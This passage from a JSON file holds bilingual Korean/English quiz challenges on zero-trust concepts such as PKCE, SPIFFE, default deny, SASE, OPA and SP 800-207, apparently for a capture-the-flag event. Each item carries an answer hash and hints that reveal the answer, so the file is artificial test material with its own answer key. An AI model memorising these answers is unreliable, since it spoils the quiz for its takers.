      "ko": "모바일 앱이나 브라우저 단일 페이지 앱 같은 공개 클라이언트는 클라이언트 시크릿을 안전히 숨길 수 없다. OAuth 2.0 은 클라이언트가 code_verifier 를 만들고 그 해시(code_challenge)를 먼저 보낸 뒤, 토큰 교환 때 원본 verifier 를 제시하게 해서 가로챈 authorization code 를 무력화한다. 이 확장의 네 글자 약어는?",
      "en": "Public clients like mobile apps or browser single-page apps cannot keep a client secret. OAuth 2.0 has the client generate a code_verifier, send its hash (code_challenge) first, then present the original verifier at token exchange — so an intercepted authorization code is worthless. Give the four-letter acronym for this extension."
    },
    "hints": {
      "ko": [
        "\"Proof Key for Code Exchange\", RFC 7636.",
        "\"픽시(pixy)\"라고 읽는다."
      ],
      "en": [
        "\"Proof Key for Code Exchange\", RFC 7636.",
        "Pronounced \"pixy\"."
      ]
    }
  },
  {
    "id": "t2_ztspiffe",
    "tier": 2,
    "cat": "ztna",
    "track": "zerotrust",
    "points": 90,
    "ci": true,
    "hash": "10aca797a724c7e9a6d5dc015a8e73dbf16e76faa1c33c4ed8e4e03d69d7733a",
    "fmt": "약어 / acronym (6글자 / 6 chars)",
    "title": {
      "ko": "워크로드에게 신분증을",
      "en": "An ID Card for Every Workload"
    },
    "prompt": {
      "ko": "제로 트러스트에서는 사람뿐 아니라 서비스·컨테이너·함수도 신원을 가져야 한다. IP 주소가 아니라 암호학적 신원으로 워크로드를 식별하는 오픈 표준이 있고, 그 구현체(SPIRE)가 각 워크로드에 자동으로 신원 문서를 발급한다. 이 워크로드 신원 프레임워크의 여섯 글자 약어는?",
      "en": "In zero trust, not just people but services, containers and functions need identities. An open standard identifies workloads by cryptographic identity rather than IP address, and its implementation (SPIRE) auto-issues an identity document to each workload. Give the six-letter acronym for this workload identity framework."
    },
    "hints": {
      "ko": [
        "\"Secure Production Identity Framework For Everyone\".",
        "구현체는 SPIRE."
      ],
      "en": [
        "\"Secure Production Identity Framework For Everyone\".",
        "Its implementation is SPIRE."
      ]
    }
  },
  {
    "id": "t2_ztlateral",
    "tier": 2,
    "cat": "segmentation",
    "track": "zerotrust",
    "points": 90,
    "ci": true,
    "hash": "aaed576b3acacd21f1b2262a9dd71f47c8853134d94868708a0c638f7ad89f92",
    "fmt": "두 단어 / two words",
    "title": {
      "ko": "한 대에서 옆 대로",
      "en": "From One Box to the Next"
    },
    "prompt": {
      "ko": "공격자가 웹서버 한 대를 침해한 뒤, 내부 신뢰를 이용해 DB·파일서버·도메인 컨트롤러로 옮겨 다니는 것. 평평한 네트워크에서는 탐지가 어렵고 APT 의 핵심 전술이다. 세분화와 \"침해를 가정하라\" 설계가 막으려는, 이 내부 이동을 부르는 두 단어(형용사 + 명사)는?",
      "en": "After compromising one web server, the attacker uses internal trust to hop to the DB, file servers and domain controller. Hard to detect on a flat network and a core APT tactic. What two words (adjective + noun) name this internal hopping that segmentation and \"assume-a-breach\" design are meant to stop?"
    },
    "hints": {
      "ko": [
        "\"옆으로(lateral)\" 일어나는 \"이동(movement)\".",
        "내부 서버 간 트래픽을 타고 일어난다."
      ],
      "en": [
        "Movement that happens \"sideways\" - lateral + movement.",
        "It rides internal server-to-server traffic."
      ]
    }
  },
  {
    "id": "t2_ztdeny",
    "tier": 2,
    "cat": "segmentation",
    "track": "zerotrust",
    "points": 90,
    "ci": true,
    "hash": "898b87a202ccb4d24bb00fe34a618cdac20d7564d6c255ba33cba99f7bab5467",
    "fmt": "두 단어 / two words",
    "title": {
      "ko": "명시되지 않으면 막는다",
      "en": "If It Isn't Listed, It's Blocked"
    },
    "prompt": {
      "ko": "제로 트러스트 세그멘테이션의 첫 번째 원칙: 명시적으로 허용되지 않은 모든 트래픽은 차단한다. Kubernetes 에서는 빈 podSelector 의 NetworkPolicy 하나로, Calico 에서는 GlobalNetworkPolicy 로 이 기준선을 깐 뒤 필요한 허용 규칙만 더한다. 이 기본 자세를 부르는 두 단어(형용사 + 동사)는?",
      "en": "The first principle of zero trust segmentation: block all traffic not explicitly allowed. In Kubernetes you lay this baseline with one NetworkPolicy on an empty podSelector; in Calico with a GlobalNetworkPolicy — then add only the allow rules you need. What two words (adjective + verb) name this baseline stance?"
    },
    "hints": {
      "ko": [
        "\"기본값은 ___\" — default + deny.",
        "반대는 default allow(기본 허용)."
      ],
      "en": [
        "\"the default is to ___\" - default + deny.",
        "The opposite is default allow."
      ]
    }
  },
  {
    "id": "t2_ztrisk",
    "tier": 2,
    "cat": "identity",
    "track": "zerotrust",
    "points": 150,
    "ci": false,
    "hash": "191b9c15c4b3331010024dd955a41eb20b320b59151758a5dfb1140189e490a6",
    "fmt": "FLAG{...}",
    "title": {
      "ko": "가중 리스크 점수",
      "en": "Weighted Risk Score"
    },
    "prompt": {
      "ko": "제로 트러스트 접근 결정 시스템은 접근 요청을 네 축으로 채점하고 가중 평균해 최종 리스크 점수를 낸다(소수점 이하 버림). 아래 프로필로 총점을 계산하고 `FLAG{RISK_<총점>}` 을 제출하라.\n\n```\nuser_score:       72\ndevice_score:     55\nnetwork_score:    40\nbehavioral_score: 30\nweights: user 0.30, device 0.35, network 0.20, behavioral 0.15\n```",
      "en": "A zero trust access-decision system scores an access request on four axes and takes a weighted average for the final risk score (truncate the fraction). Compute the total for the profile below and submit `FLAG{RISK_<total>}`.\n\n```\nuser_score:       72\ndevice_score:     55\nnetwork_score:    40\nbehavioral_score: 30\nweights: user 0.30, device 0.35, network 0.20, behavioral 0.15\n```"
    },
    "hints": {
      "ko": [
        "72·0.30 + 55·0.35 + 40·0.20 + 30·0.15.",
        "합은 53.35 → 버림 → 53."
      ],
      "en": [
        "72*0.30 + 55*0.35 + 40*0.20 + 30*0.15.",
        "The sum is 53.35 -> truncated -> 53."
      ]
    }
  },
  {
    "id": "t2_ztmm",
    "tier": 2,
    "cat": "policy",
    "track": "zerotrust",
    "points": 150,
    "ci": false,
    "hash": "9bb4343bb702b17988b192623cc07afc208b766dd0a9b1cabdf878bd72ec493f",
    "fmt": "FLAG{...}",
    "title": {
      "ko": "성숙도 백분율",
      "en": "Maturity Percentage"
    },
    "prompt": {
      "ko": "CISA Zero Trust Maturity Model v2.0 은 5개 기둥을 각각 레벨 1(전통)~4(최적)로 평가한다. 전체 성숙도(%) = round(다섯 기둥 레벨의 합 / 가능한 최댓값 × 100), 여기서 각 기둥의 최댓값은 레벨 4 다. 아래 평가 결과로 전체 성숙도를 구해 `FLAG{ZTMM_<백분율>}` 을 제출하라.\n\n```\nIdentity:      3\nDevices:       2\nNetworks:      2\nApplications:  3\nData:          1\n```",
      "en": "The CISA Zero Trust Maturity Model v2.0 rates five pillars each on levels 1 (Traditional) to 4 (Optimal). Overall maturity (%) = round(sum of the five pillar levels / the maximum possible x 100), where each pillar maxes at level 4. Compute it for the assessment below and submit `FLAG{ZTMM_<percent>}`.\n\n```\nIdentity:      3\nDevices:       2\nNetworks:      2\nApplications:  3\nData:          1\n```"
    },
    "hints": {
      "ko": [
        "레벨 합 = 3+2+2+3+1 = 11.",
        "합 11 을 최댓값(다섯 기둥 × 레벨 4)으로 나눠 100 을 곱하면 55."
      ],
      "en": [
        "Level sum = 3+2+2+3+1 = 11.",
        "Eleven over the maximum (five pillars at level four each), times one hundred, rounds to 55."
      ]
    }
  },
  {
    "id": "t3_ztmesh",
    "tier": 3,
    "cat": "segmentation",
    "track": "zerotrust",
    "points": 130,
    "ci": true,
    "hash": "eace17f238330edbd7ab7e9d3ae19dc5e7b69c2584c6e23eb8d7752690abea14",
    "fmt": "두 단어 / two words",
    "title": {
      "ko": "사이드카가 대신 거는 상호 인증",
      "en": "The Sidecar That Handles Mutual Auth"
    },
    "prompt": {
      "ko": "쿠버네티스에서 각 워크로드 옆에 프록시(Envoy 등)를 사이드카로 붙여 서비스 간 통신을 가로채는 계층이 있다. 애플리케이션 코드를 건드리지 않고 서비스끼리 오가는 모든 트래픽에 상호 인증(mTLS)과 인가 정책을 투명하게 적용한다. Istio·Linkerd 가 대표적인, 이 계층을 부르는 두 단어(명사 + 명사)는?",
      "en": "In Kubernetes, a layer attaches a proxy (Envoy, etc.) as a sidecar next to each workload and intercepts service-to-service traffic. Without touching application code, it transparently applies mutual authentication (mTLS) and authorization policy to every packet between services. Istio and Linkerd are the well-known examples. What two words (noun + noun) name this layer?"
    },
    "hints": {
      "ko": [
        "Istio 의 컨트롤 플레인은 istiod, 데이터 플레인은 Envoy 사이드카.",
        "\"서비스\" + \"그물망\"."
      ],
      "en": [
        "Istio's control plane is istiod; its data plane is the Envoy sidecar.",
        "\"service\" + a woven net."
      ]
    }
  },
  {
    "id": "t3_ztsase",
    "tier": 3,
    "cat": "ztna",
    "track": "zerotrust",
    "points": 130,
    "ci": true,
    "hash": "38872ec390687b35105ee4cde982f13cb38b8701360b023a38794c4d96b5947c",
    "fmt": "약어 / acronym (4글자 / 4 chars)",
    "title": {
      "ko": "엣지에서 다 합친다",
      "en": "Everything Converged at the Edge"
    },
    "prompt": {
      "ko": "Gartner 가 2019년에 이름 붙인 아키텍처. SD-WAN 네트워킹과 보안 기능(SWG·CASB·ZTNA·FWaaS)을 클라우드 엣지에서 하나의 서비스로 통합해, 지사·재택·모바일 사용자가 데이터센터를 경유하지 않고 가까운 PoP 에서 정책을 적용받는다. 이 네 글자 약어는? (\"사시\"라고 읽는다)",
      "en": "An architecture Gartner named in 2019. It converges SD-WAN networking with security functions (SWG, CASB, ZTNA, FWaaS) into one cloud-edge service, so branch, remote and mobile users get policy applied at a nearby PoP instead of hairpinning through a data center. Give the four-letter acronym (pronounced \"sassy\")."
    },
    "hints": {
      "ko": [
        "\"Secure Access Service Edge\".",
        "Zscaler·Cloudflare One·Prisma Access 가 이 범주."
      ],
      "en": [
        "\"Secure Access Service Edge\".",
        "Zscaler, Cloudflare One, Prisma Access are in this category."
      ]
    }
  },
  {
    "id": "t3_ztdark",
    "tier": 3,
    "cat": "segmentation",
    "track": "zerotrust",
    "points": 130,
    "ci": true,
    "hash": "3adb710573d353b7eddd3325b6877826a9740cb39a4996e9fd41b57d13f0e129",
    "fmt": "두 단어 / two words",
    "title": {
      "ko": "인증 전엔 아무것도 안 보인다",
      "en": "Nothing Is Visible Until You Authenticate"
    },
    "prompt": {
      "ko": "Software-Defined Perimeter 의 핵심 성질: 인증에 성공하기 전까지 서버와 서비스는 존재 자체가 네트워크에서 보이지 않는다. 포트는 기본 DROP 이고 스캐너에 응답하지 않는다. CSA 문서가 이 상태를 부르는 두 단어(형용사 + 명사)는?",
      "en": "The defining property of a Software-Defined Perimeter: until you authenticate successfully, the servers and services are invisible on the network — ports default to DROP and never answer a scanner. What two words (adjective + noun) does the CSA spec use for this state?"
    },
    "hints": {
      "ko": [
        "색이 어둡고(dark), 구름(cloud) 처럼 잡히지 않는다.",
        "\"어두운 구름\"."
      ],
      "en": [
        "Dark in colour, uncatchable like a cloud.",
        "\"dark\" + \"cloud\"."
      ]
    }
  },
  {
    "id": "t3_ztztx",
    "tier": 3,
    "cat": "policy",
    "track": "zerotrust",
    "points": 130,
    "ci": true,
    "hash": "053e412ad396d2b568fcfe5df7004f489f518bffa394c6fc1ffab81b141851f5",
    "fmt": "약어 / acronym (3글자 / 3 chars)",
    "title": {
      "ko": "포레스터의 확장판",
      "en": "Forrester's Extended Edition"
    },
    "prompt": {
      "ko": "제로 트러스트라는 용어를 2010년에 만든 곳은 포레스터(Forrester)다. 이후 포레스터는 이를 7개 기둥(데이터·네트워크·사람·워크로드·기기·가시성·자동화)으로 확장한 프레임워크를 발표했다. \"Zero Trust eXtended\" 를 줄인 세 글자 약어는?",
      "en": "Forrester coined the term \"zero trust\" in 2010. It later published a framework extending this into seven pillars (data, networks, people, workloads, devices, visibility, automation). Give the three-letter acronym for \"Zero Trust eXtended\"."
    },
    "hints": {
      "ko": [
        "Z, T, 그리고 eXtended 의 X.",
        "구글·연방정부의 제로 트러스트 모델과 함께 자주 인용된다."
      ],
      "en": [
        "Z, T, and the X of eXtended.",
        "Cited alongside the Google and federal zero trust models."
      ]
    }
  },
  {
    "id": "t3_ztrp",
    "tier": 3,
    "cat": "identity",
    "track": "zerotrust",
    "points": 130,
    "ci": true,
    "hash": "aeb0388497c8c3d375c157ee720698ac7878be870ad8f1aa99372fac5db45b54",
    "fmt": "두 단어 / two words",
    "title": {
      "ko": "패스키를 도메인에 묶는 것",
      "en": "What Ties a Passkey to a Domain"
    },
    "prompt": {
      "ko": "WebAuthn 에서 패스키는 특정 출처(origin)에 바인딩된다. 인증자는 서명 시 이 식별자를 함께 넣고, 브라우저는 현재 도메인과 일치할 때만 인증을 진행한다 — 그래서 피싱 사이트로는 패스키가 절대 넘어가지 않는다. 인증을 요청하고 어서션을 신뢰하는 쪽(서비스)을 가리키는 두 단어 용어는? (RP)",
      "en": "In WebAuthn a passkey is bound to a specific origin. The authenticator includes this identifier in the signature, and the browser only proceeds when it matches the current domain — so a passkey never travels to a phishing site. What two-word term names the side (the service) that requests authentication and relies on the assertion? (RP)"
    },
    "hints": {
      "ko": [
        "\"Relying ___\" — 어서션을 \"신뢰하고 의존하는\" 쪽.",
        "엔터프라이즈 SSO 의 서비스 제공자(SP)에 해당한다. R.P."
      ],
      "en": [
        "\"Relying ___\" - the side that relies on the assertion.",
        "The counterpart of the service provider (SP) in enterprise SSO. R.P."
      ]
    }
  },
  {
    "id": "t3_ztcaep",
    "tier": 3,
    "cat": "identity",
    "track": "zerotrust",
    "points": 130,
    "ci": true,
    "hash": "6efff77026095598475903547781295e01fb489a175aded6d990d5b9d6080109",
    "fmt": "약어 / acronym (4글자 / 4 chars)",
    "title": {
      "ko": "세션 중간에 마음을 바꾸다",
      "en": "Changing Your Mind Mid-Session"
    },
    "prompt": {
      "ko": "한 번 발급된 액세스 토큰은 만료까지 유효하다 — 그 사이 사용자가 위험해져도. 이를 고치려고 OpenID Foundation 의 Shared Signals Framework 위에 만든 프로파일이 있다. IdP 가 \"이 세션은 이제 위험함\", \"기기가 비준수로 바뀜\" 같은 이벤트를 실시간으로 밀어 자원 서버가 세션을 즉시 재평가하게 한다. 이 네 글자 약어는?",
      "en": "An issued access token stays valid until expiry — even if the user becomes risky in between. To fix that, a profile was built on the OpenID Foundation's Shared Signals Framework: the IdP pushes events like \"this session is now risky\" or \"device turned non-compliant\" in real time so the resource server re-evaluates the session at once. Give the four-letter acronym."
    },
    "hints": {
      "ko": [
        "\"Continuous Access Evaluation Profile\".",
        "Google 은 이 개념을 CAE 라 부른다. C.A.E.P."
      ],
      "en": [
        "\"Continuous Access Evaluation Profile\".",
        "Google calls the concept CAE. C.A.E.P."
      ]
    }
  },
  {
    "id": "t3_ztsplit",
    "tier": 3,
    "cat": "ztna",
    "track": "zerotrust",
    "points": 130,
    "ci": true,
    "hash": "ca3a95441df7d80c3386a85db51bcbb43b5cfdac3656c20422088a6c9a317cd9",
    "fmt": "두 단어 / two words",
    "title": {
      "ko": "터널 밖으로 새는 트래픽",
      "en": "Traffic That Leaks Outside the Tunnel"
    },
    "prompt": {
      "ko": "전통 VPN 을 쓰면서 성능을 위해 일부 트래픽(예: 사내 대상만)을 터널로 보내고 나머지는 로컬 인터넷으로 바로 내보내는 설정이 있다. 편하지만, 감염된 단말이 터널 밖 경로로 공격자와 통신하거나 검사를 우회하는 보안 구멍이 된다. 이 설정을 부르는 두 단어(형용사 + 동명사)는?",
      "en": "With a traditional VPN, for performance you can send only some traffic (say, corporate-bound) through the tunnel and let the rest go straight out to the local internet. Convenient, but it becomes a hole: an infected endpoint can talk to an attacker on the non-tunnel path or dodge inspection. What two words (adjective + gerund) name this configuration?"
    },
    "hints": {
      "ko": [
        "터널을 \"쪼갠다(split)\".",
        "반대는 full tunnel(전체 터널링)."
      ],
      "en": [
        "You \"split\" the tunnel.",
        "The opposite is full tunnel."
      ]
    }
  },
  {
    "id": "t3_ztopa",
    "tier": 3,
    "cat": "policy",
    "track": "zerotrust",
    "points": 130,
    "ci": true,
    "hash": "1fbe8e4f4059ee0e7e8ac840aefd2ac3224c51bb038c09f80ebb767600b9378a",
    "fmt": "약어 / acronym (3글자 / 3 chars)",
    "title": {
      "ko": "코드로 쓰는 인가 규칙",
      "en": "Authorization Rules Written as Code"
    },
    "prompt": {
      "ko": "API 게이트웨이·Kubernetes·마이크로서비스가 공통으로 쓰는 정책 결정 엔진. Rego 라는 선언형 언어로 \"관리자 역할 + 규정 준수 기기 + 두 번째 인증 요소 검증 + 업무시간\" 같은 조건을 코드로 정의하면, 서비스는 결정을 이 엔진에 위임한다(policy as code). CNCF 프로젝트인 이 엔진의 세 글자 약어는?",
      "en": "A policy-decision engine used in common by API gateways, Kubernetes and microservices. You write conditions like \"admin role + compliant device + verified second factor + business hours\" as code in a declarative language called Rego, and services delegate the decision to this engine (policy as code). Give the three-letter acronym for this CNCF project."
    },
    "hints": {
      "ko": [
        "\"Open Policy Agent\".",
        "규칙 언어는 Rego. O.P.A."
      ],
      "en": [
        "\"Open Policy Agent\".",
        "Its rule language is Rego. O.P.A."
      ]
    }
  },
  {
    "id": "t3_ztseg",
    "tier": 3,
    "cat": "segmentation",
    "track": "zerotrust",
    "points": 200,
    "ci": false,
    "hash": "72b31637749b5f1996a81c1edbbd0fef2c08cfd7aaf02544602a86c0e5f2e88b",
    "fmt": "FLAG{...}",
    "title": {
      "ko": "세그멘테이션 정책 평가",
      "en": "Evaluating a Segmentation Policy"
    },
    "prompt": {
      "ko": "아래는 네트워크 세그멘테이션 정책과 검증할 트래픽 흐름이다. 규칙은 priority 오름차순으로 평가하며, 처음 매칭되는 규칙의 action 을 따른다. 어떤 규칙도 매칭되지 않으면 fallback 을 적용한다. `*` 는 모든 세그먼트, `any` 는 모든 프로토콜/포트를 뜻한다. ALLOW 로 판정되는 흐름의 개수를 세어 `FLAG{ALLOWED_<개수>}` 를 제출하라.\n\n```\nsegments:\n  web    10.0.1.0/24\n  app    10.0.2.0/24\n  db     10.0.3.0/24\n  admin  10.0.9.0/24\nrules:\n  100  web -> app  tcp/8080  ALLOW\n  100  app -> db  tcp/5432  ALLOW\n  50  admin -> *  any  ALLOW\n  200  web -> db  any  DENY\nfallback: DENY\nflows:\n  A  10.0.1.5 -> 10.0.2.7  tcp/8080\n  B  10.0.1.5 -> 10.0.3.7  tcp/5432\n  C  10.0.2.9 -> 10.0.3.7  tcp/5432\n  D  10.0.9.2 -> 10.0.3.7  tcp/22\n  E  10.0.1.8 -> 10.0.2.7  tcp/22\n```",
      "en": "Below is a network segmentation policy and traffic flows to check. Evaluate rules in ascending priority order and take the action of the first rule that matches; if no rule matches, apply the fallback. `*` means any segment, `any` means any protocol/port. Count the flows that resolve to ALLOW and submit `FLAG{ALLOWED_<count>}`.\n\n```\nsegments:\n  web    10.0.1.0/24\n  app    10.0.2.0/24\n  db     10.0.3.0/24\n  admin  10.0.9.0/24\nrules:\n  100  web -> app  tcp/8080  ALLOW\n  100  app -> db  tcp/5432  ALLOW\n  50  admin -> *  any  ALLOW\n  200  web -> db  any  DENY\nfallback: DENY\nflows:\n  A  10.0.1.5 -> 10.0.2.7  tcp/8080\n  B  10.0.1.5 -> 10.0.3.7  tcp/5432\n  C  10.0.2.9 -> 10.0.3.7  tcp/5432\n  D  10.0.9.2 -> 10.0.3.7  tcp/22\n  E  10.0.1.8 -> 10.0.2.7  tcp/22\n```"
    },
    "hints": {
      "ko": [
        "A: web→app:8080 은 규칙 100 으로 ALLOW. B: web→db 는 규칙 200 으로 DENY.",
        "C(app→db:5432) ALLOW, D(admin→어디든) ALLOW, E(web→app 이지만 포트가 8080 아님) → fallback DENY. ALLOW 3개."
      ],
      "en": [
        "A: web->app:8080 matches rule 100 ALLOW. B: web->db matches rule 200 DENY.",
        "C (app->db:5432) ALLOW, D (admin->anywhere) ALLOW, E (web->app but the port is not 8080) -> fallback DENY. Three ALLOW."
      ]
    }
  },
  {
    "id": "t4_ztoptimal",
    "tier": 4,
    "cat": "policy",
    "track": "zerotrust",
    "points": 160,
    "ci": true,
    "hash": "9a714950f9841458f5433dd5e74d1cffc8ad95a80a0c2f12e99f4e3f3d4871d3",
    "fmt": "한 단어 / one word (7글자 / 7 chars)",
    "title": {
      "ko": "성숙도의 끝단계",
      "en": "The Final Stage of Maturity"
    },
    "prompt": {
      "ko": "CISA Zero Trust Maturity Model v2.0 은 각 기둥을 네 단계로 진단한다: Traditional → Initial → Advanced → ___. 자동화된 위험 기반 접근 결정, 비밀번호 없는 지속 인증, 실시간 기기 위험 신호 연동이 모두 갖춰진 최고 단계의 이름(영어 한 단어)은?",
      "en": "The CISA Zero Trust Maturity Model v2.0 diagnoses each pillar across four stages: Traditional -> Initial -> Advanced -> ___. Name the top stage (one English word) - where automated risk-based access decisions, passwordless continuous authentication, and real-time device-risk signal integration are all in place."
    },
    "hints": {
      "ko": [
        "일곱 글자, \"최적의\"라는 뜻.",
        "Advanced 다음, 마지막 단계."
      ],
      "en": [
        "Seven letters, means \"most favourable\".",
        "The stage after Advanced; the last one."
      ]
    }
  },
  {
    "id": "t4_ztbeyondprod",
    "tier": 4,
    "cat": "ztna",
    "track": "zerotrust",
    "points": 160,
    "ci": true,
    "hash": "596adcecfd4f084410fd829dcd96dc973ea829a3312275e969006348ed0d8e5b",
    "fmt": "한 단어 / one word (10글자 / 10 chars)",
    "title": {
      "ko": "서비스끼리의 제로 트러스트",
      "en": "Zero Trust Between Services"
    },
    "prompt": {
      "ko": "구글의 사용자→앱 제로 트러스트 모델이 사람의 접근을 다룬다면, 서비스→서비스(워크로드 간) 통신에 같은 원칙을 적용한 구글의 별도 모델이 있다. 상호 인증(mTLS), 코드 출처 검증, 이미지 서명, 최소 권한 서비스 아이덴티티를 프로덕션 전반에 강제한다. 이 모델의 이름은?",
      "en": "Where Google's user-to-app zero trust model covers people's access, Google has a separate model applying the same principles to service-to-service (workload-to-workload) communication: mutual authentication (mTLS), code-provenance checks, image signing and least-privilege service identity enforced across production. Name this model."
    },
    "hints": {
      "ko": [
        "\"Beyond\" + 프로덕션(prod).",
        "구글의 사용자 접근 제로 트러스트 모델의 워크로드 짝."
      ],
      "en": [
        "\"Beyond\" + production (prod).",
        "The workload counterpart to Google's user-access zero trust model."
      ]
    }
  },
  {
    "id": "t4_ztsvid",
    "tier": 4,
    "cat": "ztna",
    "track": "zerotrust",
    "points": 160,
    "ci": true,
    "hash": "10d33837bf4b30c7ca650b1f2f3f80eb3ce5044f00c764dafbecddd1a9dfe464",
    "fmt": "약어 / acronym (4글자 / 4 chars)",
    "title": {
      "ko": "워크로드의 신원 문서",
      "en": "A Workload's Identity Document"
    },
    "prompt": {
      "ko": "워크로드 신원 프레임워크의 구현체인 SPIRE 는 각 워크로드에 짧은 수명의 검증 가능한 신원 문서를 자동으로 발급·회전한다. 이 문서는 X.509 인증서 형태이거나 JWT 형태이며, 안에 그 워크로드의 신원 URI 가 담긴다. 이 신원 문서를 가리키는 네 글자 약어는?",
      "en": "SPIRE, the implementation of the workload identity framework, auto-issues and rotates a short-lived, verifiable identity document for each workload. It comes as an X.509 certificate or a JWT and carries that workload's identity URI inside. Give the four-letter acronym for this identity document."
    },
    "hints": {
      "ko": [
        "S, V, I, D.",
        "X.509-형과 JWT-형 두 가지가 있다."
      ],
      "en": [
        "S, V, I, D.",
        "Two forms exist: an X.509 one and a JWT one."
      ]
    }
  },
  {
    "id": "t4_ztassume",
    "tier": 4,
    "cat": "policy",
    "track": "zerotrust",
    "points": 160,
    "ci": true,
    "hash": "7f390f96b0ae0bcf9cdc9133e4804ed51bf1e7771c12c2f61667ebd417000d0a",
    "fmt": "두 단어 / two words",
    "title": {
      "ko": "이미 뚫렸다고 치자",
      "en": "Assume They're Already In"
    },
    "prompt": {
      "ko": "제로 트러스트 설계 원칙 중 하나: 시스템이 이미 침해된 것으로 가정하고 설계한다. 그래서 폭발 반경을 줄이는 네트워크 격리, 최소 권한, 종단간 암호화, 지속적 모니터링을 기본값으로 깐다. 이 원칙을 부르는 두 단어(동사 + 명사)는?",
      "en": "One of the zero trust design principles: design as if the system is already compromised. So you make blast-radius-shrinking network isolation, least privilege, end-to-end encryption and continuous monitoring the defaults. What two words (verb + noun) name this principle?"
    },
    "hints": {
      "ko": [
        "\"침해를 ___한다\" — assume + breach.",
        "\"never trust\", \"least privilege\" 와 나란히 놓이는 원칙."
      ],
      "en": [
        "\"___ a breach\" - assume + breach.",
        "Listed alongside \"never trust\" and \"least privilege\"."
      ]
    }
  },
  {
    "id": "t4_ztpe",
    "tier": 4,
    "cat": "policy",
    "track": "zerotrust",
    "points": 160,
    "ci": true,
    "hash": "35288adc70200689015b350fa40bd50c0d2e530cea58b79437bf3360c25105cd",
    "fmt": "두 단어 / two words",
    "title": {
      "ko": "허용을 결정하는 두뇌",
      "en": "The Brain That Decides Allow"
    },
    "prompt": {
      "ko": "표준 참조 제로 트러스트 아키텍처(SP 800-207)에서, 주체·자산·요청·위협 인텔·조직 정책을 입력으로 받아 신뢰 점수를 계산하고 최종적으로 접근 허용/거부를 내리는 컴포넌트가 있다. 결정만 담당하며, 실제 연결 수립은 짝 컴포넌트가 한다. 이 결정 컴포넌트의 두 단어 이름은?",
      "en": "In the standard reference zero trust architecture (SP 800-207), one component takes subject, asset, request, threat intel and organizational policy as input, computes a trust score, and ultimately grants or denies access. It only decides; a paired component actually sets up the connection. Give the two-word name of this deciding component."
    },
    "hints": {
      "ko": [
        "\"정책 ___\" — policy + engine.",
        "엔진(engine) 이 판단하고, 관리자(administrator) 가 실행한다."
      ],
      "en": [
        "\"policy ___\" - policy + engine.",
        "The engine decides; a paired administrator acts."
      ]
    }
  },
  {
    "id": "t4_ztscim",
    "tier": 4,
    "cat": "identity",
    "track": "zerotrust",
    "points": 160,
    "ci": true,
    "hash": "474a4139b79689269d0a7cb075400d54210bc5f55dd9b87985b7fcf70232c269",
    "fmt": "약어 / acronym (4글자 / 4 chars)",
    "title": {
      "ko": "입사하면 계정, 퇴사하면 삭제",
      "en": "Account on Hire, Gone on Departure"
    },
    "prompt": {
      "ko": "제로 트러스트에서 계정 수명주기 자동화는 핵심이다. HR 시스템에서 입사가 확정되면 즉시 필요한 모든 앱에 계정이 생성되고, 퇴사 시각에 맞춰 전 앱에서 동시에 비활성화된다 — 방치된 계정(고아 계정)이 공격면이 되지 않도록. IdP 와 앱 사이의 이 사용자 프로비저닝/디프로비저닝 표준의 네 글자 약어는?",
      "en": "In zero trust, automating the account lifecycle is essential. When HR confirms a hire, accounts are created at once in every app that's needed; at the minute of departure they are disabled across all apps simultaneously — so no stale (orphan) account becomes attack surface. Give the four-letter acronym for this user provisioning/deprovisioning standard between the IdP and apps."
    },
    "hints": {
      "ko": [
        "\"System for Cross-domain Identity Management\".",
        "\"스킴(skim)\"이라고 읽는다."
      ],
      "en": [
        "\"System for Cross-domain Identity Management\".",
        "Pronounced \"skim\"."
      ]
    }
  },
  {
    "id": "t4_ztagentless",
    "tier": 4,
    "cat": "ztna",
    "track": "zerotrust",
    "points": 160,
    "ci": true,
    "hash": "d4da05401722d0b0de037850b5e5aa188802854054f1d69fd7e06bb91b1d43e1",
    "fmt": "한 단어 / one word (9글자 / 9 chars)",
    "title": {
      "ko": "브라우저만 있으면 된다",
      "en": "A Browser Is All You Need"
    },
    "prompt": {
      "ko": "ZTNA 배포에는 두 방식이 있다. 하나는 기기에 클라이언트를 깔고 신원·기기 상태를 컨트롤러에 보내 앱별 터널을 연다. 다른 하나는 클라이언트 설치 없이, 사용자가 브라우저로 접속하면 ZTNA 프록시가 IdP 인증 뒤 앱 대신 응답한다. 이 클라이언트 없는 방식을 부르는 영어 한 단어는?",
      "en": "ZTNA has two deployment styles. One installs a client on the device that reports identity and device state to the controller and opens per-app tunnels. The other needs no client at all: the user connects via a browser and the ZTNA proxy responds on the app's behalf after IdP auth. Give the one English word for this client-free style."
    },
    "hints": {
      "ko": [
        "\"agent\" + \"-less\" (없음).",
        "반대는 agent-based(에이전트 기반)."
      ],
      "en": [
        "\"agent\" + \"-less\".",
        "The opposite is agent-based."
      ]
    }
  },
  {
    "id": "t4_ztpdp",
    "tier": 4,
    "cat": "policy",
    "track": "zerotrust",
    "points": 160,
    "ci": true,
    "hash": "b78df455e7e2088f31b9bc5b5b4c34718b1e77f2846a846107f456dd74622a35",
    "fmt": "약어 / acronym (3글자 / 3 chars)",
    "title": {
      "ko": "판단을 내리는 논리 컴포넌트",
      "en": "The Logical Component That Rules"
    },
    "prompt": {
      "ko": "표준 참조 제로 트러스트 아키텍처에서, 주체의 접근 요청을 받아 허용/거부를 판단하고 그 판정을 집행 지점(enforcement point)에 넘기는 논리 컴포넌트가 있다. 내부적으로는 판단부와 실행부로 나뉘지만, 하나로 묶어 세 글자 약어로 부른다. 이 약어는?",
      "en": "In the standard reference zero trust architecture, a logical component receives the subject's access request, rules allow or deny, and hands the verdict to the enforcement point. Internally it splits into a deciding part and an acting part, but as a whole it goes by a three-letter acronym. Give it."
    },
    "hints": {
      "ko": [
        "\"Policy ___ Point\" — 집행 지점(P.E.P.)의 짝.",
        "판단(decision)을 내리는 쪽. P.D.P."
      ],
      "en": [
        "\"Policy ___ Point\" - the pair of the enforcement point (P.E.P.).",
        "The side that makes the decision. P.D.P."
      ]
    }
  },
  {
    "id": "t4_zttrustalgo",
    "tier": 4,
    "cat": "policy",
    "track": "zerotrust",
    "points": 160,
    "ci": true,
    "hash": "f86440363b9b9ce8524a46991c21414f84d4a65b5cf2dfa1b96d455dc7785be9",
    "fmt": "두 단어 / two words",
    "title": {
      "ko": "결정을 내리는 계산식",
      "en": "The Formula Behind the Verdict"
    },
    "prompt": {
